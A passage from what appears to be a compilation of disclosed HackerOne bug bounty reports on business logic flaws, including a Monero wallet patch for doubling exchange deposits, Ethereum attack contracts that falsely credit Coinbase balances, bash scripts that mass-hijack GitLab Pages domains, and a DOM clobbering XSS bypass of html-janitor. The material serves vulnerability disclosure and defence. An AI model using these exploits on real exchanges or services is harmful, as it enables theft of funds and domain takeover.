    +    for (size_t i = 0; i < destinations.size(); i++)
    +      additional_tx_public_keys.push_back(txkey_pub); // One for each output.
    +
    +    add_additional_tx_pub_keys_to_extra(tx.extra, additional_tx_public_keys);
    +    add_tx_pub_key_to_extra(tx, txkey_pub);
    
         // we don't need to include additional tx keys if:
         //   - all the destinations are standard addresses
    @@ -421,9 +427,9 @@ namespace cryptonote
           output_index++;
           summary_outs_money += dst_entr.amount;
         }
    -    CHECK_AND_ASSERT_MES(additional_tx_public_keys.size() == additional_tx_keys.size(), false, "Internal error creating additional public keys");
    +    //CHECK_AND_ASSERT_MES(additional_tx_public_keys.size() == additional_tx_keys.size(), false, "Internal error creating additional public keys");
    
    -    remove_field_from_tx_extra(tx.extra, typeid(tx_extra_additional_pub_keys));
    +    //remove_field_from_tx_extra(tx.extra, typeid(tx_extra_additional_pub_keys));
    
         LOG_PRINT_L2("tx pubkey: " << txkey_pub);
         if (need_additional_txkeys)

  2\. Compile wallet
  3\. Do a regular transfer to an exchange wallet.
  4\. Profit.

## Impact

By depositing and withdrawing the same coins, doubling each time; The attacker could eventually steal all XMR from an exchange hotwallet.

---

### [Double Payout via PayPal](https://hackerone.com/reports/307239)

- **Report ID:** `307239`
- **Severity:** Critical
- **Weakness:** Business Logic Errors
- **Program:** Coinbase
- **Reporter:** @dawgyg
- **Bounty:** 10000 usd
- **Disclosed:** 2018-04-04T19:46:04.801Z
- **CVE(s):** -

**Summary (team):**

An issue with the handling of the PayPal transaction states resulted in a user being able to both withdraw money from PayPal, but not have the funds deducted from their account.

---

### [ETH contract handling errors](https://hackerone.com/reports/328526)

- **Report ID:** `328526`
- **Severity:** Critical
- **Weakness:** Business Logic Errors
- **Program:** Coinbase
- **Reporter:** @ambisafe
- **Bounty:** - usd
- **Disclosed:** 2018-04-04T19:32:14.860Z
- **CVE(s):** -

**Summary (team):**

A business logic error in the ETH contract handling code allowed for a nested `revert` call in contract execution to improperly credit a user account though funds had not been transferred. In addition, the code did not appropriately handle `delegatecall` within a contract.

Sample contract for the first issue:
```
contract InternalAttacker {
    function internalAttack(address _target) payable {
        address(this).call(bytes4(keccak256("dive(address)")), _target);
        msg.sender.transfer(this.balance);
    }
    function dive(address _target) {
        _target.transfer(this.balance);
        revert();
    }
}
```
Attacking call of the first issue:
```
eth.contract(eth.contract([{"constant":false,"inputs":[{"name":"_target","type":"address"}],"name":"internalAttack","outputs":[{"name":"","type":"bool"}],"payable":true,"type":"function","stateMutability":"payable"}]).at('<address-redacted>').internalAttack(depositAddress, {gas: 300000, value: web3.toWei('0.2')});
```

Sample contract for the second issue:
```
contract InternalDelegateAttacker2 {
    function internalAttack(address _target) payable returns(bool) {
        _target.delegatecall();
        msg.sender.transfer(this.balance);
        return true;
    }
}
```
We would like to thank @ambisafe for the prompt disclosure and assistance with both issues. Our normal bounties are $10,000 per instance of account balance manipulation. In this case, since two separate issues were reported within one report and provided enough data/context for Coinbase to immediately take action, we paid out two bounties plus a bonus for report quality.

---

### [Ethereum account balance manipulation](https://hackerone.com/reports/300748)

- **Report ID:** `300748`
- **Severity:** Critical
- **Weakness:** Business Logic Errors
- **Program:** Coinbase
- **Reporter:** @vicompany
- **Bounty:** - usd
- **Disclosed:** 2018-03-21T08:52:55.671Z
- **CVE(s):** -

**Summary (team):**

The researchers noticed an issue with our ETH receiving code when receiving from a contract. This allowed sending of ETH to Coinbase to be credited even if the underlying contract execution failed. The issue was fixed by changing the contract handling logic. Analysis of the issue indicated only accidental loss for Coinbase, and no exploitation attempts.

The Security team thanks @vicompany for the quick disclosure, and also the internal team for pushing a fix within hours. We do appreciate @vicompany's patience as the full communication loop back to HackerOne took significantly longer than the fix deployment cycle.

**Summary (researcher):**

**Short Summary:** 
By using a smart contract to distribute ether over a set of wallets you can manipulate the account balance of your Coinbase account. If 1 of the internal transactions in the smart contract fails all transactions before that will be reversed. But on Coinbase these transactions will not be reversed, meaning someone could add as much ether to their balance as they want. When you look up the Coinbase wallet address after this transaction you will see that it is empty, but checking your Coinbase wallet will show your funds.

**Steps To Reproduce:**
* Setup a smart contract with a few valid Coinbase wallets and 1 final faulty wallet (always throw exception when receiving funds smart contract for example)
* Transfer appropriate funds to smart contract.
* Execute smart contract adding the set amount of ether to the Coinbase wallets without ever actually leaving the smart contract wallet because the complete transaction fails at the last wallet.
* Repeat until you have more than enough ethereum in your Coinbase wallet.
* Cash out, transfer to off site wallet

For some more information see
https://www.vicompany.nl/magazine/from-christmas-present-in-the-blockchain-to-massive-bug-bounty

---

### [Using GitLab to monitor and hijack domains in mass quantity.](https://hackerone.com/reports/312118)

- **Report ID:** `312118`
- **Severity:** High
- **Weakness:** Business Logic Errors
- **Program:** GitLab
- **Reporter:** @edoverflow
- **Bounty:** 750 usd
- **Disclosed:** 2018-02-21T23:46:26.928Z
- **CVE(s):** -

**Vulnerability Information:**

# Vulnerability Description

There is a logic flaw in how GitLab pages can set custom domains that allows an attacker to actively monitor domains and hijack them as soon as they point to `52.167.214.135`. GitLab allows setting an unlimited number of domains for a single repository. 

First, I wrote a fully-fledged exploit that hijacks unclaimed domains. In under 5s I managed to secure 110 domains.

```bash
#!/bin/bash

searches=(
    "The resource that you are attempting to access does not exist or you don't have the necessary permissions to view it."
)

gron "https://app.securitytrails.com/api/search/by_type/ip/52.167.214.135" | fgrep "domain" | grep -o '"[^"]\+"' | cut -d '"' -f 2 > whiteknight-temp

while read domain; do
    if host "$domain"> /dev/null; then
        echo $domain;
    fi;
done < whiteknight-temp >> domains

cat domains | uniq | sed -e 's/^/https:\/\//' >> domains-to-test

meg / domains-to-test

for str in "${searches[@]}"; do
    grep --color -Hnri "$str" out/
done

while read target; do
    curl --silent 'https://gitlab.com/███████████████████/███████████████████/pages/domains' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' --compressed -H 'Accept-Language: en-GB,en;q=0.5' -H 'Cache-Control: no-cache' -H 'Connection: keep-alive' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: _gitlab_session=███████████████████; sidebar_collapsed=false' -H 'DNT: 1' -H 'Host: gitlab.com' -H 'Pragma: no-cache' -H 'Referer: https://gitlab.com/edoverflow-gitlab/hakyll/pages/domains/new' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0' --data "utf8=✓&authenticity_token=████████████████&pages_domain[domain]=$target&pages_domain[certificate]&pages_domain[key]"
done < domains

gio trash whiteknight-temp domains domains-to-test out/
```

Then I modified the script to gather any domain and add it to my repository. This means that as soon as someone points their domain to `52.167.214.135`, my repository will hijack their domain, and serve content on that domain. This prevents the user from even creating a repository on GitLab with that domain.

```bash
#!/bin/bash

IPS=(
    # GitLab
    "52.167.214.135"
    # GitHub
    "192.30.252.153"
    "192.30.252.154"
    # Shopify
    "23.227.38.32"
)

for ip in "${IPS[@]}"; do
    gron "https://app.securitytrails.com/api/search/by_type/ip/$ip" | fgrep "domain" | grep -o '"[^"]\+"' | cut -d '"' -f 2 > whiteknight-temp
done

while read domain; do
    if host "$domain"> /dev/null; then
        echo $domain;
    fi;
done < whiteknight-temp >> domains

while read target; do
    curl --silent 'https://gitlab.com/███████████████████/███████████████████/pages/domains' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' --compressed -H 'Accept-Language: en-GB,en;q=0.5' -H 'Cache-Control: no-cache' -H 'Connection: keep-alive' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: _gitlab_session=███████████████████; sidebar_collapsed=false' -H 'DNT: 1' -H 'Host: gitlab.com' -H 'Pragma: no-cache' -H 'Referer: https://gitlab.com/edoverflow-gitlab/hakyll/pages/domains/new' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0' --data "utf8=✓&authenticity_token=███████████████████&pages_domain[domain]=$target&pages_domain[certificate]&pages_domain[key]"
done < domains

gio trash whiteknight-temp domains domains-to-test out/
```

Please note that you could just extract a bunch of domains from the Alexa or randomly from the web, I just use `securitytrails.com` to demonstrate the issue without affecting your users.

# Proof of concept

With my colleague's permission, I asked them to set an A record for their personal domain (http://danfield.photography/) pointing to `52.167.214.135`. They set the A record **after** I had added their domain to my repository. After a couple of minutes, their domain was serving my repository's content.

# Mitigation

Since this is a logic flaw, there will be multiple ways to mitigate the issue.

1. You could restrict repositories to only a single custom domain — this is what GitHub does.
2. Require users to place a randomly generated string as a TXT record on their domain when confirming ownership of the domain.
3. Not store the domain until it actually points to `52.167.214.135` — currently you store any domain pointing to various other services and IPs.

## Impact

GitLab allows unrestricted mass-scale monitoring and claiming of domains. This attack can be performed in mere seconds.

---

### [[html-janitor] Bypassing sanitization using DOM clobbering](https://hackerone.com/reports/308158)

- **Report ID:** `308158`
- **Severity:** High
- **Weakness:** Business Logic Errors
- **Program:** Node.js third-party modules
- **Reporter:** @bayotop
- **Bounty:** - usd
- **Disclosed:** 2018-02-05T17:54:24.558Z
- **CVE(s):** CVE-2017-0928

**Vulnerability Information:**

**Module:**

Name: [html-janitor](https://www.npmjs.com/package/html-janitor)
Version: 2.0.2

**Summary:**

Arbitrary HTML can pass the sanitization process, which can be unexpected and dangerous (XSS) in case user-controlled input is passed to the clean function.

**Description:**

Proof of concept:

```javascript
var myJanitor = new HTMLJanitor({tags:{p:{}}});
var cleanHtml = myJanitor.clean("<form><object onmouseover=alert(document.domain) name=_sanitized></object></form>")
console.log(cleanHtml) // logs: <form><object onmouseover=alert(document.domain) name=_sanitized></object></form>
```
The following check can be leveraged to bypass the whole sanitization process:

```javascript
do {
  // Ignore nodes that have already been sanitized
  if (node._sanitized) {
      continue;
  }
...
```

As `node` is the first child in the created tree walker (i.e. in this case the `<form>` tag) `node._sanitized` will point to the inner `<object>` and the check passes.

To learn more about DOM clobbering see: https://www.youtube.com/watch?v=5W-zGBKvLxk (by Mario Heiderich)

**Recommendation:**

It should be enough to set `node._sanitized` to `false` every time a new node is being processed. 

*Note that I previously reported this issue at https://github.com/guardian/html-janitor/issues/35*

## Impact

Given the module's description I would assume it should be used to prevent XSS vulnerabilities. This is currently a very dangerous assumption given that the whole sanitization process can be bypassed.

Note that the author might have never intended to feed untrusted data into the clean() function. In that case this is *just* a regular issue. Furthermore, the fact that untrusted data is unexpected should be at least mentioned in the documentation, because other developers most certainly will use the package in such scenarios.

---

### [2FA user enumeration via login](https://hackerone.com/reports/249467)

- **Report ID:** `249467`
- **Severity:** High
- **Weakness:** Business Logic Errors
- **Program:** Legal Robot
- **Reporter:** @goodhackonly
- **Bounty:** - usd
- **Disclosed:** 2017-08-08T03:06:25.418Z
- **CVE(s):** -

**Summary (team):**

While going live with additional 2FA options, a security researcher discovered that during login, users that had enabled 2FA were prompted for a second factor, even with an incorrect password (i.e. LR correctly rejected the login attempt without a second factor, but rejected *all* attempts for that user regardless of what password was used). This could have allowed enumeration of users that had enabled 2FA. To some degree, 2FA enumeration was mitigated by existing rate-limiting. This was resolved by the fix for #249431, which had the same root cause.

---
